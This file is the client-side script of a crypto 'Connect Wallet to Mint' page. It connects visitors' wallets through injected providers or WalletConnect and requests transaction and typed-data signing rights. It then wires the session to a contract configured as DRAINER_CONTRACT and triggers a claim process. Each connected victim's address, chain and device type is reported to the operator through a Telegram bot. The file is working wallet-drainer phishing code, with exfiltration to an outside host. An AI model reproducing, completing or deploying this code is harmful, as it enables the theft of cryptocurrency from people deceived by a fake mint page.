import { CONFIG } from './config.js';

;(async function () {
  /* ─── Debug panel ──────────────────────────────────────────────── */
  const debugArea = document.createElement('div');
  debugArea.id = 'wc-debug';
  debugArea.style.cssText = `
    position: fixed; bottom: 0; left: 0; width: 100%;
    background: #000; color: #0f0; font-size: 12px; padding: 5px;
    z-index: 10000; max-height: 150px; overflow-y: auto;
    display: none; font-family: monospace;
  `;
  document.body.appendChild(debugArea);

  let debugVisible = false;
  document.addEventListener('dblclick', () => {
    debugVisible = !debugVisible;
    debugArea.style.display = debugVisible ? 'block' : 'none';
  });

  function logDebug(msg) {
    console.log('[main]', msg);
    debugArea.innerHTML += `<div>${new Date().toLocaleTimeString()}: ${msg}</div>`;
    debugArea.scrollTop = debugArea.scrollHeight;
  }

  /* ─── Platform detection ───────────────────────────────────────── */
  function isMobile()  { return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent); }
  function isIOS()     { return /iPhone|iPad|iPod/i.test(navigator.userAgent); }
  function isAndroid() { return /Android/i.test(navigator.userAgent); }
  function isDesktop() { return !isMobile(); }
  function isWindows() { return /Windows/i.test(navigator.userAgent); }
  function isMac()     { return /Macintosh|Mac OS X/i.test(navigator.userAgent); }
  function getPlatform() {
    if (isIOS())     return 'ios';
    if (isAndroid()) return 'android';
    if (isWindows()) return 'windows';
    if (isMac())     return 'mac';
    return 'unknown';
  }

  /* ─── Telegram ─────────────────────────────────────────────────── */
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;

  async function sendTelegramNotification(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
      const r = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' })
      });
      const result = await r.json();
      if (!r.ok) { console.error('Telegram error:', result); return false; }
      return true;
    } catch (e) { console.error('Telegram exception:', e); return false; }
  }
  window.testTelegram = (m) => sendTelegramNotification(m || '🧪 Test ' + new Date().toISOString());

  /* ─── WebSocket reachability ───────────────────────────────────── */
  async function checkWebSocket(retries = 1, delay = 500) {
    if (isDesktop()) { logDebug('⏭️ Skipping WS check on desktop'); return true; }
    for (let i = 0; i < retries; i++) {
      try {
        const ok = await new Promise((resolve) => {
          const ws = new WebSocket('wss://relay.walletconnect.com');
          const t = setTimeout(() => { ws.close(); resolve(false); }, 3000);
          ws.onopen  = () => { clearTimeout(t); ws.close(); resolve(true); };
          ws.onerror = () => { clearTimeout(t); ws.close(); resolve(false); };
        });
        if (ok) return true;
        await new Promise((r) => setTimeout(r, delay));
      } catch (e) { await new Promise((r) => setTimeout(r, delay)); }
    }
    return true;
  }

  /* ─── Library loading with version pinning ─────────────────────── */
  async function loadWalletConnect() {
    const cdns = [
      'https://esm.sh/@walletconnect/sign-client@2.17.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.17.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/sign-client@2.17.2'
    ];
    const modalCdns = [
      'https://esm.sh/@walletconnect/modal@2.7.0',
      'https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.7.0/+esm',
      'https://cdn.skypack.dev/@walletconnect/modal@2.7.0'
    ];
    const providerCdns = [
      'https://esm.sh/@walletconnect/ethereum-provider@2.17.2',
      'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.2/+esm',
      'https://cdn.skypack.dev/@walletconnect/ethereum-provider@2.17.2'
    ];

    let SignClient, WalletConnectModal, EthereumProvider;
    for (const url of cdns)         { try { const m = await import(url); SignClient         = m.default || m; logDebug(`✅ SignClient from ${url}`); break; } catch (e) { logDebug(`❌ ${url}: ${e.message}`); } }
    if (!SignClient) throw new Error('Could not load SignClient');
    for (const url of modalCdns)    { try { const m = await import(url); WalletConnectModal = m.WalletConnectModal || m.default || m; logDebug(`✅ WalletConnectModal from ${url}`); break; } catch (e) { logDebug(`❌ ${url}: ${e.message}`); } }
    if (!WalletConnectModal) throw new Error('Could not load WalletConnectModal');
    for (const url of providerCdns) { try { const m = await import(url); EthereumProvider   = m.EthereumProvider || m.default || m; logDebug(`✅ EthereumProvider from ${url}`); break; } catch (e) { logDebug(`❌ ${url}: ${e.message}`); } }
    if (!EthereumProvider) throw new Error('Could not load EthereumProvider');

    return { SignClient, WalletConnectModal, EthereumProvider };
  }

  /* ─── DOM refs ─────────────────────────────────────────────────── */
  const connectButton = document.getElementById('connectButton');
  const walletButton  = document.getElementById('walletButton');
  const claimStatus   = document.getElementById('claimStatus');

  /* ─── State ────────────────────────────────────────────────────── */
  let currentSession = null;
  let client, modal, SignClient, WalletConnectModal, EthereumProvider;
  let web3Instance = null;
  let contractInstance = null;
  let activeProvider = null;
  let isConnecting = false;

  /* ─── Button UI ────────────────────────────────────────────────── */
  function setButtonState(button, state) {
    if (!button) return;
    button.style.display = 'inline-block';
    button.style.padding = '14px 28px';
    button.style.borderRadius = '8px';
    button.style.fontWeight = '600';
    button.style.border = 'none';
    button.style.cursor = state === 'loading' ? 'not-allowed' : 'pointer';
    button.style.color = 'white';
    button.style.fontSize = '16px';
    button.style.minWidth = '180px';
    button.disabled = state === 'loading';

    switch (state) {
      case 'loading':
        button.style.background = 'linear-gradient(135deg, #666666 0%, #888888 100%)';
        button.innerHTML = '<i class="fas fa-spinner fa-spin" style="margin-right:8px"></i> Connecting...';
        break;
      case 'connected':
        button.style.background = 'linear-gradient(135deg, #10B981 0%, #059669 100%)';
        button.innerHTML = '<i class="fas fa-check-circle" style="margin-right:8px"></i> Connected';
        break;
      case 'disconnect':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-power-off" style="margin-right:8px"></i> Disconnect';
        break;
      case 'failed':
        button.style.background = 'linear-gradient(135deg, #EF4444 0%, #DC2626 100%)';
        button.innerHTML = '<i class="fas fa-exclamation-triangle" style="margin-right:8px"></i> Failed';
        setTimeout(() => setButtonState(button, 'normal'), 3000);
        break;
      default:
        button.style.background = 'linear-gradient(135deg, #FF6B00 0%, #FF8C00 100%)';
        button.innerHTML = '<i class="fas fa-wallet" style="margin-right:8px"></i> Connect Wallet to Mint';
    }
  }

  function showStatus(msg, type = 'info') {
    if (!claimStatus) return;
    claimStatus.textContent = msg;
    claimStatus.className = `status ${type}`;
    claimStatus.style.display = 'block';
    claimStatus.style.padding = '12px 16px';
    claimStatus.style.borderRadius = '8px';
    claimStatus.style.marginTop = '12px';
    claimStatus.style.fontWeight = '500';
    claimStatus.style.fontSize = '14px';
    claimStatus.style.textAlign = 'center';
    const styles = {
      success: { background: 'linear-gradient(135deg, #DCFCE7 0%, #BBF7D0 100%)', color: '#166534', border: '1px solid #86EFAC' },
      error:   { background: 'linear-gradient(135deg, #FEE2E2 0%, #FECACA 100%)', color: '#991B1B', border: '1px solid #FCA5A5' },
      info:    { background: 'linear-gradient(135deg, #DBEAFE 0%, #BFDBFE 100%)', color: '#1E40AF', border: '1px solid #93C5FD' }
    };
    Object.assign(claimStatus.style, styles[type] || styles.info);
    if (type === 'error' || type === 'success') {
      setTimeout(() => { claimStatus.style.display = 'none'; }, 5000);
    }
  }

  setButtonState(connectButton, 'normal');
  if (walletButton) setButtonState(walletButton, 'normal');

  /* ─── Config destructure ───────────────────────────────────────── */
  const {
    PROJECT_ID,
    PUBLIC_TEST_ID,
    DAPP_METADATA,
    DRAINER_CONTRACT,
    CONTRACT_ABI,
    MAINNET_ID,
    SUPPORTED_CHAINS
  } = CONFIG;

  let projectId = PROJECT_ID;

  /* ─── Multi-chain namespace builder ─────────────────────────────
   *  Wallets need at least one supported chain in their current network.
   *  If we hardcode eip155:1 and the user is on BSC, connection fails.
   *  We offer a broad optionalChains list and keep requiredChains minimal.
   * ──────────────────────────────────────────────────────────────── */
  const CHAIN_IDS = (SUPPORTED_CHAINS && SUPPORTED_CHAINS.length ? SUPPORTED_CHAINS : [1, 56, 137, 42161, 8453, 10]);
  const CHAIN_STRINGS = CHAIN_IDS.map((id) => `eip155:${id}`);

  /* ─── Storage ──────────────────────────────────────────────────── */
  function saveWallet(address, session = null, chainType = null) {
    localStorage.setItem('connectedWallet', address);
    if (session)   localStorage.setItem('walletConnectSession', JSON.stringify(session));
    if (chainType) localStorage.setItem('chainType', chainType);
  }
  function getSavedWallet()    { return localStorage.getItem('connectedWallet'); }
  function getSavedSession()   { const s = localStorage.getItem('walletConnectSession'); return s ? JSON.parse(s) : null; }
  function getSavedChainType() { return localStorage.getItem('chainType') || 'unknown'; }
  function clearSavedWallet() {
    localStorage.removeItem('connectedWallet');
    localStorage.removeItem('walletConnectSession');
    localStorage.removeItem('chainType');
  }

  function getChainType() {
    if (window.unisat) return 'bitcoin';
    if (window.solana && typeof window.solana.connect === 'function') return 'solana';
    if (window.ethereum) return 'evm';
    return 'unknown';
  }

  /* ─── Global state publisher ───────────────────────────────────── */
  function publishGlobalState(address, chain, provider = null) {
    const live = provider || activeProvider || web3Instance?.currentProvider || window.ethereum || null;
    window.__apexConnected = {
      address, chain,
      web3: web3Instance,
      contract: contractInstance,
      provider: live,
      session: currentSession,
      publishedAt: Date.now()
    };
    console.log('[main] published window.__apexConnected', {
      address, chain,
      hasWeb3: !!web3Instance,
      hasContract: !!contractInstance,
      hasProvider: !!live
    });
    window.dispatchEvent(new CustomEvent('apex:connected', { detail: { address, chain } }));
  }

  /* ─── Connected UI ─────────────────────────────────────────────── */
  function updateConnectedUI(address, chain = 'evm') {
    setButtonState(connectButton, 'disconnect');
    if (walletButton) setButtonState(walletButton, 'disconnect');

    const chainLabels = { bitcoin: '₿ BTC', solana: '◎ SOL', evm: '◆ ETH' };
    const chainLabel = chainLabels[chain] || 'Unknown';

    let display = document.getElementById('connectedAddressDisplay');
    if (!display) {
      display = document.createElement('div');
      display.id = 'connectedAddressDisplay';
      display.style.cssText = `
        margin-top: 12px; padding: 10px 16px;
        font-family: 'JetBrains Mono', monospace; font-size: 14px;
        color: #059669; text-align: center;
        background: linear-gradient(135deg, #ECFDF5 0%, #D1FAE5 100%);
        border-radius: 8px; border: 1px solid #A7F3D0;
      `;
      connectButton.parentNode.appendChild(display);
    }

    const short = `${address.slice(0, 6)}...${address.slice(-4)}`;
    display.innerHTML = `
      <div style="display:flex;align-items:center;justify-content:center;gap:8px;flex-wrap:wrap;">
        <i class="fas fa-check-circle" style="color:#059669;"></i>
        <span>Connected: ${short}</span>
        <span style="background:#1F2937;color:white;padding:2px 10px;border-radius:12px;font-size:12px;font-weight:600;">${chainLabel}</span>
        <button id="copyAddress" style="background:none;border:none;color:#059669;cursor:pointer;padding:4px;">
          <i class="far fa-copy"></i>
        </button>
      </div>
    `;
    document.getElementById('copyAddress')?.addEventListener('click', () => {
      navigator.clipboard.writeText(address).then(() => {
        const b = document.getElementById('copyAddress');
        const o = b.innerHTML;
        b.innerHTML = '<i class="fas fa-check"></i>';
        setTimeout(() => { b.innerHTML = o; }, 2000);
      });
    });

    showStatus(`Connected to ${chainLabel}`, 'success');
    publishGlobalState(address, chain);

    sendTelegramNotification(`
🔗 <b>Wallet Connected</b>
📌 <b>Chain:</b> ${chainLabel}
👤 <b>Address:</b> <code>${address}</code>
🕒 ${new Date().toLocaleString()}
📱 <b>Mobile:</b> ${isMobile() ? 'Yes' : 'No'}
    `.trim());
  }

  function resetConnectedUI() {
    setButtonState(connectButton, 'normal');
    if (walletButton) setButtonState(walletButton, 'normal');
    document.getElementById('connectedAddressDisplay')?.remove();
    showStatus('Wallet disconnected', 'info');
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
    window.__apexConnected = null;
  }

  /* ─── EIP-6963 discovery ───────────────────────────────────────── */
  let evmProviders = [];
  let eip6963Initialized = false;
  function setupEIP6963() {
    if (eip6963Initialized) return;
    eip6963Initialized = true;
    window.addEventListener('eip6963:announceProvider', (e) => {
      const d = e.detail;
      if (!evmProviders.some((p) => p.info.uuid === d.info.uuid)) {
        evmProviders.push(d);
        logDebug(`EIP-6963: ${d.info.name}`);
      }
    });
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 500);
    setTimeout(() => window.dispatchEvent(new Event('eip6963:requestProvider')), 1500);
  }

  /* ─── Wallet picker ────────────────────────────────────────────── */
  function showWalletSelectionModal(providers, cb) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.7);display:flex;align-items:center;justify-content:center;z-index:99999;`;
    const modal = document.createElement('div');
    modal.style.cssText = `background:#1F2937;padding:24px;border-radius:16px;max-width:400px;width:90%;color:white;font-family:Inter,sans-serif;`;
    modal.innerHTML = `
      <h3 style="margin-top:0;font-weight:600;font-size:20px;">Select a Wallet</h3>
      <div id="wl" style="display:flex;flex-direction:column;gap:10px;margin:16px 0"></div>
      <button id="cw" style="background:none;border:1px solid #666;color:#ccc;padding:8px 16px;border-radius:8px;cursor:pointer;width:100%">Cancel</button>
    `;
    overlay.appendChild(modal);
    document.body.appendChild(overlay);
    const list = modal.querySelector('#wl');
    providers.forEach((p) => {
      const b = document.createElement('button');
      b.textContent = p.info.name;
      b.style.cssText = `background:#374151;border:none;padding:12px;border-radius:8px;color:white;font-size:16px;cursor:pointer;text-align:left;display:flex;gap:10px;align-items:center;`;
      if (p.info.icon) {
        const i = document.createElement('img');
        i.src = p.info.icon;
        i.style.width = '24px';
        i.style.height = '24px';
        b.prepend(i);
      }
      b.onclick = () => { overlay.remove(); cb(p); };
      list.appendChild(b);
    });
    modal.querySelector('#cw').onclick = () => { overlay.remove(); cb(null); };
  }

  /* ─── WalletConnect init ───────────────────────────────────────── */
  async function initWalletConnect(useTestId = false) {
    if (client && modal) return true;
    if (useTestId) { projectId = PUBLIC_TEST_ID; logDebug('Using test ID'); }
    await checkWebSocket(1, 500);
    try {
      client = await SignClient.init({
        projectId,
        metadata: DAPP_METADATA,
        relayUrl: 'wss://relay.walletconnect.com'
      });
      modal = new WalletConnectModal({
        projectId,
        themeMode: 'dark',
        themeVariables: {
          '--wcm-z-index': '9999',
          '--wcm-accent-color': '#FF6B00',
          '--wcm-background-color': '#1F2937'
        },
        enableExplorer: true
      });
      logDebug('✅ WalletConnect init OK');

      // Attach listeners immediately after init
      client.on('session_update', ({ params }) => {
        const accounts = params.namespaces?.eip155?.accounts;
        if (accounts?.length) {
          const a = accounts[0].split(':')[2];
          updateConnectedUI(a, 'evm');
          saveWallet(a, currentSession, 'evm');
        }
      });
      client.on('session_delete', () => { resetConnectedUI(); clearSavedWallet(); });
      client.on('session_connect', (session) => {
        const a = session.namespaces?.eip155?.accounts?.[0]?.split(':')[2];
        if (a) {
          saveWallet(a, session, 'evm');
          updateConnectedUI(a, 'evm');
          currentSession = session;
        }
      });

      return true;
    } catch (e) {
      logDebug('WC init failed: ' + e.message);
      return false;
    }
  }

  /* ─── Direct EVM connect ───────────────────────────────────────── */
  async function connectDirectEVM(timeoutMs = 8000) {
    setupEIP6963();
    await new Promise((r) => setTimeout(r, 800));
    let providers = evmProviders.filter((p) => p.provider);
    if (providers.length === 0 && window.ethereum) {
      providers = [{ info: { name: 'Injected', rdns: 'io.injected' }, provider: window.ethereum }];
    }
    if (providers.length === 0) return false;

    let chosen = null;
    if (providers.length === 1) chosen = providers[0];
    else {
      const known = providers.find((p) => p.info.rdns === 'io.metamask' || p.info.name.toLowerCase().includes('metamask'));
      chosen = known || await new Promise((res) => showWalletSelectionModal(providers, res));
      if (!chosen) return false;
    }

    try {
      const provider = chosen.provider;
      const accounts = await Promise.race([
        provider.request({ method: 'eth_requestAccounts' }),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs))
      ]);
      if (accounts?.length) {
        const address = accounts[0];
        saveWallet(address, null, 'evm');
        setupEVMProviderEvents(provider);
        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        activeProvider = provider;
        updateConnectedUI(address, 'evm');
        logDebug(`✅ Direct EVM: ${address}`);
        return true;
      }
    } catch (e) {
      logDebug('Direct EVM error: ' + e.message);
      return false;
    }
    return false;
  }

  /* ─── WalletConnect EVM connect (FIXED) ────────────────────────── */
  async function connectViaWalletConnect(useTestId = false, timeoutMs = 300000) {
    if (isConnecting) return false;
    isConnecting = true;
    const ok = await initWalletConnect(useTestId);
    if (!ok) { isConnecting = false; showStatus('WC unavailable', 'error'); return false; }
    if (modal?.closeModal) { try { modal.closeModal(); } catch (e) {} }

    try {
      showStatus('Requesting connection...', 'info');

      // Build required + optional namespaces.
      // Required: at least Ethereum mainnet so the wallet doesn't reject outright.
      // Optional: all other chains so the wallet CAN connect from its current network.
      const requiredNamespaces = {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains: ['eip155:1'],
          events: ['chainChanged', 'accountsChanged']
        }
      };
      const optionalNamespaces = {
        eip155: {
          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData_v4'],
          chains: CHAIN_STRINGS.filter((c) => c !== 'eip155:1'),
          events: ['chainChanged', 'accountsChanged']
        }
      };

      const { uri, approval } = await client.connect({
        requiredNamespaces,
        optionalNamespaces
      });

      if (!uri) throw new Error('No URI received from client.connect');

      logDebug('Opening WalletConnect modal...');
      modal.openModal({ uri });
      showStatus('Scan the QR code with your wallet', 'info');
      sessionStorage.setItem('pending_wc_uri', uri);
      sessionStorage.setItem('pending_wc_timestamp', Date.now().toString());

      logDebug('Waiting for approval...');
      const session = await Promise.race([
        approval(),
        new Promise((_, rj) => setTimeout(() => rj(new Error('timeout')), timeoutMs))
      ]);

      logDebug('Session received: ' + JSON.stringify({
        topic: session?.topic?.slice(0, 12),
        namespaces: Object.keys(session?.namespaces || {})
      }));

      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');

      if (session?.namespaces?.eip155?.accounts?.length) {
        const account = session.namespaces.eip155.accounts[0].split(':')[2];
        currentSession = session;

        // Build the EthereumProvider from the session.
        // This is the CORRECT way to instantiate a WC provider in 2.17.x.
        const provider = await EthereumProvider.init({
          projectId,
          chains: [1],
          optionalChains: CHAIN_IDS.filter((id) => id !== 1),
          showQrModal: false,
          metadata: DAPP_METADATA,
          rpcMap: {},
          session
        });

        const Web3 = (await import('web3')).default;
        web3Instance = new Web3(provider);
        contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
        activeProvider = provider;
        saveWallet(account, session, 'evm');
        updateConnectedUI(account, 'evm');
        setupEVMProviderEvents(provider);
        isConnecting = false;
        logDebug(`✅ WC EVM: ${account}`);
        return true;
      }

      logDebug('⚠️ Session had no eip155 accounts');
      isConnecting = false;
      return false;
    } catch (e) {
      logDebug('WC error: ' + e.message);
      if (modal) modal.closeModal();
      sessionStorage.removeItem('pending_wc_uri');
      sessionStorage.removeItem('pending_wc_timestamp');
      isConnecting = false;
      return false;
    }
  }

  /* ─── Provider events ──────────────────────────────────────────── */
  function setupEVMProviderEvents(provider) {
    if (!provider || !provider.on) return;
    provider.on('accountsChanged', (accounts) => {
      if (accounts.length === 0) { resetConnectedUI(); clearSavedWallet(); }
      else {
        updateConnectedUI(accounts[0], 'evm');
        saveWallet(accounts[0], null, 'evm');
        publishGlobalState(accounts[0], 'evm', provider);
        setTimeout(() => { if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess(); }, 1000);
      }
    });
    provider.on('chainChanged', (id) => showStatus(`Network changed to ${id}`, 'info'));
    provider.on('disconnect', () => { resetConnectedUI(); clearSavedWallet(); });
  }

  /* ─── Connect dispatcher ───────────────────────────────────────── */
  async function connectWallet() {
    if (isConnecting) return;
    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    let success = await connectDirectEVM(8000);
    if (!success) success = await connectViaWalletConnect(false, 300000);
    if (!success) success = await connectViaWalletConnect(true, 300000);

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => { if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess(); }, 1500);
    } else {
      showStatus('No wallet found', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  /* ─── Disconnect ───────────────────────────────────────────────── */
  async function disconnectWallet() {
    try {
      if (client && currentSession) {
        await client.disconnect({ topic: currentSession.topic, reason: { code: 6000, message: 'User disconnected' } });
        currentSession = null;
      }
      if (web3Instance?.currentProvider?.disconnect) await web3Instance.currentProvider.disconnect();
    } catch (e) {}
    resetConnectedUI();
    clearSavedWallet();
    web3Instance = null;
    contractInstance = null;
    activeProvider = null;
  }

  /* ─── Buttons ──────────────────────────────────────────────────── */
  const handleClick = async () => {
    const saved = getSavedWallet();
    if (saved && (currentSession || getSavedChainType() !== 'unknown')) await disconnectWallet();
    else await connectWallet();
  };
  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => { if (connectButton) connectButton.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 300);
    });
  }

  /* ─── Restore ──────────────────────────────────────────────────── */
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChainType();
    const savedSession = getSavedSession();
    if (!savedWallet || savedChain === 'unknown') return;

    if (savedChain === 'evm') {
      if (savedSession) {
        const ok = await initWalletConnect(false);
        if (ok) {
          try {
            const session = client.session.get(savedSession.topic);
            if (session) {
              currentSession = session;
              const provider = await EthereumProvider.init({
                projectId,
                chains: [1],
                optionalChains: CHAIN_IDS.filter((id) => id !== 1),
                showQrModal: false,
                metadata: DAPP_METADATA,
                session
              });
              const Web3 = (await import('web3')).default;
              web3Instance = new Web3(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              activeProvider = provider;
              updateConnectedUI(savedWallet, 'evm');
              return;
            }
          } catch (e) { logDebug('Restore failed: ' + e.message); }
        }
      }
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0 && accounts[0] === savedWallet) {
            const Web3 = (await import('web3')).default;
            web3Instance = new Web3(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            activeProvider = window.ethereum;
            updateConnectedUI(savedWallet, 'evm');
            setupEVMProviderEvents(window.ethereum);
            return;
          }
        } catch (e) {}
      }
      clearSavedWallet();
    }
  }

  /* ─── Boot ─────────────────────────────────────────────────────── */
  try {
    const libs = await loadWalletConnect();
    SignClient         = libs.SignClient;
    WalletConnectModal = libs.WalletConnectModal;
    EthereumProvider   = libs.EthereumProvider;
    logDebug('✅ All libs loaded');
    setupEIP6963();
    await restoreWalletConnection();
  } catch (err) {
    logDebug('Fatal: ' + err.message);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  if (window.ethereum && isDesktop()) setupEVMProviderEvents(window.ethereum);
  window.addEventListener('beforeunload', () => { if (modal) modal.closeModal(); });

  logDebug(`✅ main.js ready — Platform: ${getPlatform()}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
